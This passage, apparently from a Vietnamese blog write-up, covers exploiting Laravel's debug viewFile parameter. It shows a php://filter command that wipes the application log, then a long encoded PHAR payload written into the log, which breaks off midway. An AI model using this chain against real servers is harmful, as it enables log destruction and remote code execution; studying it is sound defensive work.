</span></span></code></pre></td></tr></table></div></div><p>thì phải đệm thêm 1 byte <code>=00</code> vào để decode được nhé.</p><h4 id=bước-2-xoá-log>Bước 2: Xoá log<a hidden class=anchor aria-hidden=true href=#bước-2-xoá-log>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>viewFile</span><span class=o>:</span> <span class=nx>php</span><span class=o>://</span><span class=nx>filter</span><span class=o>/</span><span class=nx>write</span><span class=o>=</span><span class=nx>convert</span><span class=o>.</span><span class=nx>base64</span><span class=o>-</span><span class=nx>decode</span><span class=o>|</span><span class=nx>convert</span><span class=o>.</span><span class=nx>base64</span><span class=o>-</span><span class=nx>decode</span><span class=o>|</span><span class=nx>convert</span><span class=o>.</span><span class=nx>base64</span><span class=o>-</span><span class=nx>decode</span><span class=o>/</span><span class=nx>resource</span><span class=o>=/</span><span class=nx>path</span><span class=o>/</span><span class=nx>to</span><span class=o>/</span><span class=nx>storage</span><span class=o>/</span><span class=nx>logs</span><span class=o>/</span><span class=nx>laravel</span><span class=o>.</span><span class=nx>log</span>
</span></span></code></pre></td></tr></table></div></div><blockquote><p>Chẳng hiểu kiểu gì bạn với sếp mình dùng cách này xoá được log mà mình phải dùng cách khác để xoá log >.&lt;</p></blockquote><h4 id=bước-3-tạo-log-chứa-payload>Bước 3: Tạo log chứa payload<a hidden class=anchor aria-hidden=true href=#bước-3-tạo-log-chứa-payload>#</a></h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>viewFile</span><span class=o>:</span> <span class=nx>P</span><span class=o>=</span><span class=mo>00</span><span class=nx>D</span><span class=o>=</span><span class=mo>00</span><span class=mi>9</span><span class=o>=</span><span class=mo>00</span><span class=nx>w</span><span class=o>=</span><span class=mo>00</span><span class=nx>a</span><span class=o>=</span><span class=mo>00</span><span class=nx>H</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>g</span><span class=o>=</span><span class=mo>00</span><span class=nx>X</span><span class=o>=</span><span class=mo>001</span><span class=o>=</span><span class=mo>00</span><span class=mi>9</span><span class=o>=</span><span class=mo>00</span><span class=nx>I</span><span class=o>=</span><span class=mo>00</span><span class=nx>Q</span><span class=o>=</span><span class=mo>00</span><span class=nx>U</span><span class=o>=</span><span class=mo>00</span><span class=nx>x</span><span class=o>=</span><span class=mo>00</span><span class=nx>U</span><span class=o>=</span><span class=mo>00</span><span class=nx>X</span><span class=o>=</span><span class=mo>000</span><span class=o>=</span><span class=mo>00</span><span class=nx>N</span><span class=o>=</span><span class=mo>00</span><span class=nx>P</span><span class=o>=</span><span class=mo>00</span><span class=nx>T</span><span class=o>=</span><span class=mo>00</span><span class=nx>V</span><span class=o>=</span><span class=mo>00</span><span class=nx>B</span><span class=o>=</span><span class=mo>00</span><span class=nx>J</span><span class=o>=</span><span class=mo>00</span><span class=nx>T</span><span class=o>=</span><span class=mo>00</span><span class=nx>E</span><span class=o>=</span><span class=mo>00</span><span class=nx>V</span><span class=o>=</span><span class=mo>00</span><span class=nx>S</span><span class=o>=</span><span class=mo>00</span><span class=nx>K</span><span class=o>=</span><span class=mo>00</span><span class=nx>C</span><span class=o>=</span><span class=mo>00</span><span class=nx>k</span><span class=o>=</span><span class=mo>007</span><span class=o>=</span><span class=mo>00</span><span class=nx>I</span><span class=o>=</span><span class=mo>00</span><span class=nx>D</span><span class=o>=</span><span class=mo>00</span><span class=mi>8</span><span class=o>=</span><span class=mo>00</span><span class=o>+=</span><span class=mo>00</span><span class=nx>D</span><span class=o>=</span><span class=mo>00</span><span class=nx>Q</span><span class=o>=</span><span class=mo>00</span><span class=nx>r</span><span class=o>=</span><span class=mo>00</span><span class=nx>F</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>g</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>g</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>B</span><span class=o>=</span><span class=mo>00</span><span class=nx>E</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>B</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>B</span><span class=o>=</span><span class=mo>00</span><span class=nx>u</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>g</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>T</span><span class=o>=</span><span class=mo>00</span><span class=nx>z</span><span class=o>=</span><span class=mo>00</span><span class=nx>o</span><span class=o>=</span><span class=mo>00</span><span class=nx>z</span><span class=o>=</span><span class=mo>00</span><span class=nx>M</span><span class=o>=</span><span class=mo>00</span><span class=nx>j</span><span class=o>=</span><span class=mo>00</span><span class=nx>o</span><span class=o>=</span><span class=mo>00</span><span class=nx>i</span><span class=o>=</span><span class=mo>00</span><span class=nx>T</span><span class=o>=</span><span class=mo>00</span><span class=nx>W</span><span class=o>=</span><span class=mo>00</span><span class=mi>9</span><span class=o>=</span><span class=mo>00</span><span class=nx>u</span><span class=o>=</span><span class=mo>00</span><span class=nx>b</span><span class=o>=</span><span class=mo>002</span><span class=o>=</span><span class=mo>00</span><span class=nx>x</span><span class=o>=</span><span class=mo>00</span><span class=nx>v</span><span class=o>=</span><span class=mo>00</span><span class=nx>Z</span><span class=o>=</span><span class=mo>001</span><span class=o>=</span><span class=mo>00</span><span class=nx>x</span><span class=o>=</span><span class=mo>00</span><span class=nx>I</span><span class=o>=</span><span class=mo>00</span><span class=nx>Y</span><span class=o>=</span><span class=mo>00</span><span class=nx>W</span><span class=o>=</span><span class=mo>005</span><span class=o>=</span><span class=mo>00</span><span class=nx>k</span><span class=o>=</span><span class=mo>00</span><span class=nx>b</span><span class=o>=</span><span class=mo>00</span><span class=nx>G</span><span class=o>=</span><span class=mo>00</span><span class=nx>V</span><span class=o>=</span><span class=mo>00</span><span class=nx>y</span><span class=o>=</span><span class=mo>00</span><span class=nx>X</span><span class=o>=</span><span class=mo>00</span><span class=nx>F</span><span class=o>=</span><span class=mo>00</span><span class=nx>N</span><span class=o>=</span><span class=mo>005</span><span class=o>=</span><span class=mo>00</span><span class=nx>c</span><span class=o>=</span><span class=mo>002</span><span class=o>=</span><span class=mo>00</span><span class=nx>x</span><span class=o>=</span><span class=mo>00</span><span class=nx>v</span><span class=o>=</span><span class=mo>00</span><span class=nx>Z</span><span class=o>=</span><span class=mo>001</span><span class=o>=</span><span class=mo>00</span><span class=nx>V</span><span class=o>=</span><span class=mo>00</span><span class=nx>k</span><span class=o>=</span><span class=mo>00</span><span class=nx>c</span><span class=o>=</span><span class=mo>00</span><span class=nx>E</span><span class=o>=</span><span class=mo>00</span><span class=nx>h</span><span class=o>=</span><span class=mo>00</span><span class=nx>h</span><span class=o>=</span><span class=mo>00</span><span class=nx>b</span><span class=o>=</span><span class=mo>00</span><span class=nx>m</span><span class=o>=</span><span class=mo>00</span><span class=nx>R</span><span class=o>=</span><span class=mo>00</span><span class=nx>s</span><span class=o>=</span><span class=mo>00</span><span class=nx>Z</span><span class=o>=</span><span class=mo>00</span><span class=nx>X</span><span class=o>=</span><span class=mo>00</span><span class=nx>I</span><span class=o>=</span><span class=mo>00</span><span class=nx>i</span><span class=o>=</span><span class=mo>00</span><span class=nx>O</span><span class=o>=</span><span class=mo>00</span><span class=nx>j</span><span class=o>=</span><span class=mo>00</span><span class=nx>E</span><span class=o>=</span><span class=mo>006</span><span class=o>=</span><span class=mo>00</span><span class=nx>e</span><span class=o>=</span><span class=mo>003</span><span class=o>=</span><span class=mo>00</span><span class=nx>M</span><span class=o>=</span><span class=mo>006</span><span class=o>=</span><span class=mo>00</span><span class=nx>O</span><span class=o>=</span><span class=mo>00</span><span class=nx>T</span><span class=o>=</span><span class=mo>00</span><span class=nx>o</span><span class=o>=</span><span class=mo>00</span><span class=nx>i</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>C</span><span class=o>=</span><span class=mo>00</span><span class=nx>o</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>c</span><span class=o>=</span><span class=mo>002</span><span class=o>=</span><span class=mo>00</span><span class=mi>9</span><span class=o>=</span><span class=mo>00</span><span class=nx>j</span><span class=o>=</span><span class=mo>00</span><span class=nx>a</span><span class=o>=</span><span class=mo>002</span><span class=o>=</span><span class=mo>00</span><span class=nx>V</span><span class=o>=</span><span class=mo>000</span><span class=o>=</span><span class=mo>00</span><span class=nx>I</span><span class=o>=</span><span class=mo>00</span><span class=nx>j</span><span class=o>=</span><span class=mo>00</span><span class=nx>t</span><span class=o>=</span><span class=mo>00</span><span class=nx>P</span><span class=o>=</span><span class=mo>00</span><span class=nx>O</span><span class=o>=</span><span class=mo>00</span><span class=nx>j</span><span class=o>=</span><span class=mo>00</span><span class=nx>I</span><span class=o>=</span><span class=mo>005</span><span class=o>=</span><span class=mo>00</span><span class=nx>O</span><span class=o>=</span><span class=mo>00</span><span class=nx>i</span><span class=o>=</span><span class=mo>00</span><span class=nx>J</span><span class=o>=</span><span class=mo>00</span><span class=nx>N</span><span class=o>=</span><span class=mo>00</span><span class=nx>b</span><span class=o>=</span><span class=mo>002</span><span class=o>=</span><span class=mo>005</span><span class=o>=</span><span class=mo>00</span><span class=nx>v</span><span class=o>=</span><span class=mo>00</span><span class=nx>b</span><span class=o>=</span><span class=mo>00</span><span class=nx>G</span><span class=o>=</span><span class=mo>00</span><span class=mi>9</span><span class=o>=</span><span class=mo>00</span><span class=nx>n</span><span class=o>=</span><span class=mo>00</span><span class=nx>X</span><span class=o>=</span><span class=mo>00</span><span class=nx>E</span><span class=o>=</span><span class=mo>00</span><span class=nx>h</span><span class=o>=</span><span class=mo>00</span><span class=nx>h</span><span class=o>=</span><span class=mo>00</span><span class=nx>b</span><span class=o>=</span><span class=mo>00</span><span class=nx>m</span><span class=o>=</span><span class=mo>00</span><span class=nx>R</span><span class=o>=</span><span class=mo>00</span><span class=nx>s</span><span class=o>=</span><span class=mo>00</span><span class=nx>Z</span><span class=o>=</span><span class=mo>00</span><span class=nx>X</span><span class=o>=</span><span class=mo>00</span><span class=nx>J</span><span class=o>=</span><span class=mo>00</span><span class=nx>c</span><span class=o>=</span><span class=mo>00</span><span class=nx>Q</span><span class=o>=</span><span class=mo>00</span><span class=nx>n</span><span class=o>=</span><span class=mo>00</span><span class=nx>V</span><span class=o>=</span><span class=mo>00</span><span class=nx>m</span><span class=o>=</span><span class=mo>00</span><span class=nx>Z</span><span class=o>=</span><span class=mo>00</span><span class=nx>m</span><span class=o>=</span><span class=mo>00</span><span class=nx>V</span><span class=o>=</span><span class=mo>00</span><span class=nx>y</span><span class=o>=</span><span class=mo>00</span><span class=nx>S</span><span class=o>=</span><span class=mo>00</span><span class=nx>G</span><span class=o>=</span><span class=mo>00</span><span class=nx>F</span><span class=o>=</span><span class=mo>00</span><span class=nx>u</span><span class=o>=</span><span class=mo>00</span><span class=nx>Z</span><span class=o>=</span><span class=mo>00</span><span class=nx>G</span><span class=o>=</span><span class=mo>00</span><span class=nx>x</span><span class=o>=</span><span class=mo>00</span><span class=nx>l</span><span class=o>=</span><span class=mo>00</span><span class=nx>c</span><span class=o>=</span><span class=mo>00</span><span class=nx>i</span><span class=o>=</span><span class=mo>00</span><span class=nx>I</span><span class=o>=</span><span class=mo>006</span><span class=o>=</span><span class=mo>00</span><span class=nx>N</span><span class=o>=</span><span class=mo>00</span><span class=nx>z</span><span class=o>=</span><span class=mo>00</span><span class=nx>p</span><span class=o>=</span><span class=mo>007</span><span class=o>=</span><span class=mo>00</span><span class=nx>c</span><span class=o>=</span><span class=mo>00</span><span class=nx>z</span><span class=o>=</span><span class=mo>00</span><span class=nx>o</span><span class=o>=</span><span class=mo>00</span><span class=nx>x</span><span class=o>=</span><span class=mo>00</span><span class=nx>M</span><span class=o>=</span><span class=mo>00</span><span class=nx>D</span><span class=o>=</span><span class=mo>00</span><span class=nx>o</span><span class=o>=</span><span class=mo>00</span><span class=nx>i</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>C</span><span class=o>=</span><span class=mo>00</span><span class=nx>o</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>a</span><span class=o>=</span><span class=mo>00</span><span class=nx>G</span><span class=o>=</span><span class=mo>00</span><span class=nx>F</span><span class=o>=</span><span class=mo>00</span><span class=nx>u</span><span class=o>=</span><span class=mo>00</span><span class=nx>Z</span><span class=o>=</span><span class=mo>00</span><span class=nx>G</span><span class=o>=</span><span class=mo>00</span><span class=nx>x</span><span class=o>=</span><span class=mo>00</span><span class=nx>l</span><span class=o>=</span><span class=mo>00</span><span class=nx>c</span><span class=o>=</span><span class=mo>00</span><span class=nx>i</span><span class=o>=</span><span class=mo>00</span><span class=nx>I</span><span class=o>=</span><span class=mo>007</span><span class=o>=</span><span class=mo>00</span><span class=nx>T</span><span class=o>=</span><span class=mo>00</span><span class=nx>z</span><span class=o>=</span><span class=mo>00</span><span class=nx>o</span><span class=o>=</span><span class=mo>00</span><span class=nx>y</span><span class=o>=</span><span class=mo>00</span><span class=nx>O</span><span class=o>=</span><span class=mo>00</span><span class=nx>T</span><span class=o>=</span><span class=mo>00</span><span class=nx>o</span><span class=o>=</span><span class=mo>00</span><span class=nx>i</span><span class=o>=</span><span class=mo>00</span><span class=nx>T</span><span class=o>=</span><span class=mo>00</span><span class=nx>W</span><span class=o>=</span><span class=mo>00</span><span class=mi>9</span><span class=o>=</span><span class=mo>00</span><span class=nx>u</span><span class=o>=</span><span class=mo>00</span><span class=nx>b</span><span class=o>=</span><span class=mo>002</span><span class=o>=</span><span class=mo>00</span><span class=nx>x</span><span class=o>=</span><span class=mo>00</span><span class=nx>v</span><span class=o>=</span><span class=mo>00</span><span class=nx>Z</span><span class=o>=</span><span class=mo>001</span><span class=o>=</span><span class=mo>00</span><span class=nx>x</span><span class=o>=</span><span class=mo>00</span><span class=nx>I</span><span class=o>=</span><span class=mo>00</span><span class=nx>Y</span><span class=o>=</span><span class=mo>00</span><span class=nx>W</span><span class=o>=</span><span class=mo>005</span><span class=o>=</span><span class=mo>00</span><span class=nx>k</span><span class=o>=</span><span class=mo>00</span><span class=nx>b</span><span class=o>=</span><span class=mo>00</span><span class=nx>G</span><span class=o>=</span><span class=mo>00</span><span class=nx>V</span><span class=o>=</span><span class=mo>00</span><span class=nx>y</span><span class=o>=</span><span class=mo>00</span><span class=nx>X</span><span class=o>=</span><span class=mo>00</span><span class=nx>E</span><span class=o>=</span><span class=mo>00</span><span class=nx>J</span><span class=o>=</span><span class=mo>001</span><span class=o>=</span><span class=mo>00</span><span class=nx>Z</span><span class=o>=</span><span class=mo>00</span><span class=nx>m</span><span class=o>=</span><span class=mo>00</span><span class=nx>Z</span><span class=o>=</span><span class=mo>00</span><span class=nx>l</span><span class=o>=</span><span class=mo>00</span><span class=nx>c</span><span class=o>=</span><span class=mo>00</span><span class=nx>k</span><span class=o>=</span><span class=mo>00</span><span class=nx>h</span><span class=o>=</span><span class=mo>00</span><span class=nx>h</span><span class=o>=</span><span class=mo>00</span><span class=nx>b</span><span class=o>=</span><span class=mo>00</span><span class=nx>m</span><span class=o>=</span><span class=mo>00</span><span class=nx>R</span><span class=o>=</span><span class=mo>00</span><span class=nx>s</span><span class=o>=</span><span class=mo>00</span><span class=nx>Z</span><span class=o>=</span><span class=mo>00</span><span class=nx>X</span><span class=o>=</span><span class=mo>00</span><span class=nx>I</span><span class=o>=</span><span class=mo>00</span><span class=nx>i</span><span class=o>=</span><span class=mo>00</span><span class=nx>O</span><span class=o>=</span><span class=mo>00</span><span class=nx>j</span><span class=o>=</span><span class=mo>00</span><span class=nx>c</span><span class=o>=</span><span class=mo>006</span><span class=o>=</span><span class=mo>00</span><span class=nx>e</span><span class=o>=</span><span class=mo>003</span><span class=o>=</span><span class=mo>00</span><span class=nx>M</span><span class=o>=</span><span class=mo>006</span><span class=o>=</span><span class=mo>00</span><span class=nx>M</span><span class=o>=</span><span class=mo>00</span><span class=nx>T</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>006</span><span class=o>=</span><span class=mo>00</span><span class=nx>I</span><span class=o>=</span><span class=mo>00</span><span class=nx>g</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>q</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>G</span><span class=o>=</span><span class=mo>00</span><span class=nx>h</span><span class=o>=</span><span class=mo>00</span><span class=nx>h</span><span class=o>=</span><span class=mo>00</span><span class=nx>b</span><span class=o>=</span><span class=mo>00</span><span class=nx>m</span><span class=o>=</span><span class=mo>00</span><span class=nx>R</span><span class=o>=</span><span class=mo>00</span><span class=nx>s</span><span class=o>=</span><span class=mo>00</span><span class=nx>Z</span><span class=o>=</span><span class=mo>00</span><span class=nx>X</span><span class=o>=</span><span class=mo>00</span><span class=nx>I</span><span class=o>=</span><span class=mo>00</span><span class=nx>i</span><span class=o>=</span><span class=mo>00</span><span class=nx>O</span><span class=o>=</span><span class=mo>000</span><span class=o>=</span><span class=mo>004</span><span class=o>=</span><span class=mo>007</span><span class=o>=</span><span class=mo>00</span><span class=nx>c</span><span class=o>=</span><span class=mo>00</span><span class=nx>z</span><span class=o>=</span><span class=mo>00</span><span class=nx>o</span><span class=o>=</span><span class=mo>00</span><span class=nx>x</span><span class=o>=</span><span class=mo>00</span><span class=nx>M</span><span class=o>=</span><span class=mo>00</span><span class=nx>z</span><span class=o>=</span><span class=mo>00</span><span class=nx>o</span><span class=o>=</span><span class=mo>00</span><span class=nx>i</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>C</span><span class=o>=</span><span class=mo>00</span><span class=nx>o</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>Y</span><span class=o>=</span><span class=mo>00</span><span class=nx>n</span><span class=o>=</span><span class=mo>00</span><span class=nx>V</span><span class=o>=</span><span class=mo>00</span><span class=nx>m</span><span class=o>=</span><span class=mo>00</span><span class=nx>Z</span><span class=o>=</span><span class=mo>00</span><span class=nx>m</span><span class=o>=</span><span class=mo>00</span><span class=nx>V</span><span class=o>=</span><span class=mo>00</span><span class=nx>y</span><span class=o>=</span><span class=mo>00</span><span class=nx>U</span><span class=o>=</span><span class=mo>002</span><span class=o>=</span><span class=mo>00</span><span class=nx>l</span><span class=o>=</span><span class=mo>006</span><span class=o>=</span><span class=mo>00</span><span class=nx>Z</span><span class=o>=</span><span class=mo>00</span><span class=nx>S</span><span class=o>=</span><span class=mo>00</span><span class=nx>I</span><span class=o>=</span><span class=mo>007</span><span class=o>=</span><span class=mo>00</span><span class=nx>a</span><span class=o>=</span><span class=mo>00</span><span class=nx>T</span><span class=o>=</span><span class=mo>00</span><span class=nx>o</span><span class=o>=</span><span class=mo>00</span><span class=nx>t</span><span class=o>=</span><span class=mo>00</span><span class=nx>M</span><span class=o>=</span><span class=mo>00</span><span class=nx>T</span><span class=o>=</span><span class=mo>00</span><span class=nx>t</span><span class=o>=</span><span class=mo>00</span><span class=nx>z</span><span class=o>=</span><span class=mo>00</span><span class=nx>O</span><span class=o>=</span><span class=mo>00</span><span class=nx>j</span><span class=o>=</span><span class=mo>00</span><span class=nx>k</span><span class=o>=</span><span class=mo>006</span><span class=o>=</span><span class=mo>00</span><span class=nx>I</span><span class=o>=</span><span class=mo>00</span><span class=nx>g</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>q</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>G</span><span class=o>=</span><span class=mo>00</span><span class=nx>J</span><span class=o>=</span><span class=mo>001</span><span class=o>=</span><span class=mo>00</span><span class=nx>Z</span><span class=o>=</span><span class=mo>00</span><span class=nx>m</span><span class=o>=</span><span class=mo>00</span><span class=nx>Z</span><span class=o>=</span><span class=mo>00</span><span class=nx>l</span><span class=o>=</span><span class=mo>00</span><span class=nx>c</span><span class=o>=</span><span class=mo>00</span><span class=nx>i</span><span class=o>=</span><span class=mo>00</span><span class=nx>I</span><span class=o>=</span><span class=mo>007</span><span class=o>=</span><span class=mo>00</span><span class=nx>Y</span><span class=o>=</span><span class=mo>00</span><span class=nx>T</span><span class=o>=</span><span class=mo>00</span><span class=nx>o</span><span class=o>=</span><span class=mo>00</span><span class=nx>x</span><span class=o>=</span><span class=mo>00</span><span class=nx>O</span><span class=o>=</span><span class=mo>00</span><span class=nx>n</span><span class=o>=</span><span class=mo>00</span><span class=nx>t</span><span class=o>=</span><span class=mo>00</span><span class=nx>p</span><span class=o>=</span><span class=mo>00</span><span class=nx>O</span><span class=o>=</span><span class=mo>00</span><span class=nx>j</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>007</span><span class=o>=</span><span class=mo>00</span><span class=nx>Y</span><span class=o>=</span><span class=mo>00</span><span class=nx>T</span><span class=o>=</span><span class=mo>00</span><span class=nx>o</span><span class=o>=</span><span class=mo>00</span><span class=nx>y</span><span class=o>=</span><span class=mo>00</span><span class=nx>O</span><span class=o>=</span><span class=mo>00</span><span class=nx>n</span><span class=o>=</span><span class=mo>00</span><span class=nx>t</span><span class=o>=</span><span class=mo>00</span><span class=nx>p</span><span class=o>=</span><span class=mo>00</span><span class=nx>O</span><span class=o>=</span><span class=mo>00</span><span class=nx>j</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>007</span><span class=o>=</span><span class=mo>00</span><span class=nx>c</span><span class=o>=</span><span class=mo>00</span><span class=nx>z</span><span class=o>=</span><span class=mo>00</span><span class=nx>o</span><span class=o>=</span><span class=mo>002</span><span class=o>=</span><span class=mo>00</span><span class=nx>O</span><span class=o>=</span><span class=mo>00</span><span class=nx>i</span><span class=o>=</span><span class=mo>00</span><span class=nx>J</span><span class=o>=</span><span class=mo>00</span><span class=nx>s</span><span class=o>=</span><span class=mo>00</span><span class=nx>c</span><span class=o>=</span><span class=mo>00</span><span class=nx>y</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>t</span><span class=o>=</span><span class=mo>00</span><span class=nx>b</span><span class=o>=</span><span class=mo>00</span><span class=nx>G</span><span class=o>=</span><span class=mo>00</span><span class=nx>E</span><span class=o>=</span><span class=mo>00</span><span class=nx>i</span><span class=o>=</span><span class=mo>00</span><span class=nx>O</span><span class=o>=</span><span class=mo>003</span><span class=o>=</span><span class=mo>00</span><span class=nx>M</span><span class=o>=</span><span class=mo>006</span><span class=o>=</span><span class=mo>00</span><span class=nx>N</span><span class=o>=</span><span class=mo>00</span><span class=nx>T</span><span class=o>=</span><span class=mo>00</span><span class=nx>o</span><span class=o>=</span><span class=mo>00</span><span class=nx>i</span><span class=o>=</span><span class=mo>00</span><span class=nx>b</span><span class=o>=</span><span class=mo>00</span><span class=nx>G</span><span class=o>=</span><span class=mo>00</span><span class=nx>V</span><span class=o>=</span><span class=mo>002</span><span class=o>=</span><span class=mo>00</span><span class=nx>Z</span><span class=o>=</span><span class=mo>00</span><span class=nx>W</span><span class=o>=</span><span class=mo>00</span><span class=nx>w</span><span class=o>=</span><span class=mo>00</span><span class=nx>i</span><span class=o>=</span><span class=mo>00</span><span class=nx>O</span><span class=o>=</span><span class=mo>000</span><span class=o>=</span><span class=mo>004</span><span class=o>=</span><span class=mo>007</span><span class=o>=</span><span class=mo>00</span><span class=nx>f</span><span class=o>=</span><span class=mo>00</span><span class=nx>X</span><span class=o>=</span><span class=mo>001</span><span class=o>=</span><span class=mo>00</span><span class=nx>z</span><span class=o>=</span><span class=mo>00</span><span class=nx>O</span><span class=o>=</span><span class=mo>00</span><span class=nx>j</span><span class=o>=</span><span class=mo>00</span><span class=nx>g</span><span class=o>=</span><span class=mo>006</span><span class=o>=</span><span class=mo>00</span><span class=nx>I</span><span class=o>=</span><span class=mo>00</span><span class=nx>g</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>q</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>G</span><span class=o>=</span><span class=mo>00</span><span class=nx>x</span><span class=o>=</span><span class=mo>00</span><span class=nx>l</span><span class=o>=</span><span class=mo>00</span><span class=nx>d</span><span class=o>=</span><span class=mo>00</span><span class=nx>m</span><span class=o>=</span><span class=mo>00</span><span class=nx>V</span><span class=o>=</span><span class=mo>00</span><span class=nx>s</span><span class=o>=</span><span class=mo>00</span><span class=nx>I</span><span class=o>=</span><span class=mo>00</span><span class=nx>j</span><span class=o>=</span><span class=mo>00</span><span class=nx>t</span><span class=o>=</span><span class=mo>00</span><span class=nx>O</span><span class=o>=</span><span class=mo>00</span><span class=nx>O</span><span class=o>=</span><span class=mo>003</span><span class=o>=</span><span class=mo>00</span><span class=nx>M</span><span class=o>=</span><span class=mo>006</span><span class=o>=</span><span class=mo>00</span><span class=nx>M</span><span class=o>=</span><span class=mo>00</span><span class=nx>T</span><span class=o>=</span><span class=mo>00</span><span class=nx>Q</span><span class=o>=</span><span class=mo>006</span><span class=o>=</span><span class=mo>00</span><span class=nx>I</span><span class=o>=</span><span class=mo>00</span><span class=nx>g</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>q</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>G</span><span class=o>=</span><span class=mo>00</span><span class=nx>l</span><span class=o>=</span><span class=mo>00</span><span class=nx>u</span><span class=o>=</span><span class=mo>00</span><span class=nx>a</span><span class=o>=</span><span class=mo>00</span><span class=nx>X</span><span class=o>=</span><span class=mo>00</span><span class=nx>R</span><span class=o>=</span><span class=mo>00</span><span class=nx>p</span><span class=o>=</span><span class=mo>00</span><span class=nx>Y</span><span class=o>=</span><span class=mo>00</span><span class=nx>W</span><span class=o>=</span><span class=mo>00</span><span class=nx>x</span><span class=o>=</span><span class=mo>00</span><span class=nx>p</span><span class=o>=</span><span class=mo>00</span><span class=nx>e</span><span class=o>=</span><span class=mo>00</span><span class=nx>m</span><span class=o>=</span><span class=mo>00</span><span class=nx>V</span><span class=o>=</span><span class=mo>00</span><span class=nx>k</span><span class=o>=</span><span class=mo>00</span><span class=nx>I</span><span class=o>=</span><span class=mo>00</span><span class=nx>j</span><span class=o>=</span><span class=mo>00</span><span class=nx>t</span><span class=o>=</span><span class=mo>00</span><span class=nx>i</span><span class=o>=</span><span class=mo>00</span><span class=nx>O</span><span class=o>=</span><span class=mo>00</span><span class=nx>j</span><span class=o>=</span><span class=mo>00</span><span class=nx>E</span><span class=o>=</span><span class=mo>007</span><span class=o>=</span><span class=mo>00</span><span class=nx>c</span><span class=o>=</span><span class=mo>00</span><span class=nx>z</span><span class=o>=</span><span class=mo>00</span><span class=nx>o</span><span class=o>=</span><span class=mo>00</span><span class=nx>x</span><span class=o>=</span><span class=mo>00</span><span class=nx>N</span><span class=o>=</span><span class=mo>00</span><span class=nx>D</span><span class=o>=</span><span class=mo>00</span><span class=nx>o</span><span class=o>=</span><span class=mo>00</span><span class=nx>i</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>C</span><span class=o>=</span><span class=mo>00</span><span class=nx>o</span><span class=o>=</span><span class=mo>00</span><span class=nx>A</span><span class=o>=</span><span class=mo>00</span><span class=nx>Y</span><span class=o>=</span><span class=mo>00</span><span class=nx>n</span><span class=o>=</span><span class=mo>00</span><span class=nx>V</span><span class=o>=</span><span class=mo>00</span><span class=nx>m</span><span class=o>=</span><span class=mo>00</span><span class=nx>Z</span><span class=o>=</span><span class=mo>00</span><span class=nx>m</span><span class=o>=</span><span class=mo>00</span><span class=nx>V</span><span class=o>=</span><span class=mo>00</span><span class=nx>y</span><span class=o>=</span><span class=mo>00</span><span class=nx>T</span><span class=o>=</span><span class=mo>00</span><span class=nx>G</span><span class=o>=</span><span class=mo>00</span><span 